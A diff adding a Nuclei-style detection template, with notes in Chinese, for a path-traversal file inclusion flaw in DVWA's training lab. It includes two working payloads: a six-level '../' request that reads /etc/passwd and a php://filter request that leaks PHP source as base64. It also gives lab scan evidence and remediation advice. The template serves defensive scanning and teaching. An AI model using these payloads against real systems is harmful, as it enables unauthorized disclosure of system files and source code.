@@ -1,0 +1,72 @@
+id: B1-DVWA-LFI-PATH-TRAVERSAL
+
+info:
+  name: DVWA File Inclusion - Path Traversal (?page=)
+  author: forge-detector
+  severity: high
+  description: |
+    检测 DVWA low 档 `/vulnerabilities/fi/?page=` 的 PHP 文件包含路径穿越漏洞。
+
+    原理：DVWA low 把 `$_GET['page']` 直接交给 `include()`。PHP 的相对 include
+    按**被包含脚本所在目录**解析，因此上跳到根目录需要 6 级 `../`。
+
+    关键实测数据（loop3 深度扫描，证据见 metadata.loop3-evidence）：
+      depth 1..5  -> HTTP 200，body 恒为 3680B，无文件内容（无效）
+      depth 6      -> HTTP 200，body 6936B，检出 root:x:0:0（首次命中）
+      绝对路径      -> 与 6 级等价（1/1 成功）
+      php://filter -> 解出以 <?php 开头的源码（3/3）
+
+    判据是**响应体内容**，不是状态码：DVWA low 的 display_errors 表现是
+    「文件不存在也返回 200 且无 Warning」（loop3 实测），状态码零区分度。
+  remediation: |
+    不要把用户输入交给 include()。改用固定白名单映射并对 key 做 in_array 校验。
+    同时关闭 allow_url_include。
+  reference:
+    - security/learning/loop3-b-dvwa-bwapp-report-t4-20261012.md
+    - security/learning/_evidence/verified-loop3-b-b1-depth-20261012-2236.json
+  classification:
+    cwe-id: CWE-22, CWE-98
+  metadata:
+    bounty-forge: loop4-t2
+    loop3-finding-id: B1-LFI-01
+    destructive: "false"
+    http-methods: GET
+    request-count: "2"
+    max-request-rate: "1/s"
+    depth-critical: "6"
+    depth-default-reason: "PHP 相对 include 按被包含脚本所在目录解析；loop3 实测 4 级无效、6 级才首次命中"
+    requires-auth: "true"
+    auth-note: "DVWA 未登录时关卡返回 302 -> login.php。本模板无登录动作，命中 302 即判 not-vulnerable。"
+    judging: "判据 = 响应体内容。负对照已内建：不存在文件返回 200 + 3680B + 无 root:x，不判命中。"
+    loop3-evidence: "depth1-5=无效(3680B)；depth6=命中(6936B/root:x:0:0)；绝对路径 1/1；phpfilter 3/3（2036B）；笔记误记的 4 级 payload 为 0/3"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/fi/?page=../../../../../../etc/passwd"
+    headers:
+      User-Agent: bounty-forge-detector/1.0 (read-only, local lab)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=include.php"
+    headers:
+      User-Agent: bounty-forge-detector/1.0 (read-only, local lab)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "[A-Za-z0-9+/]{200,}={0,2}"
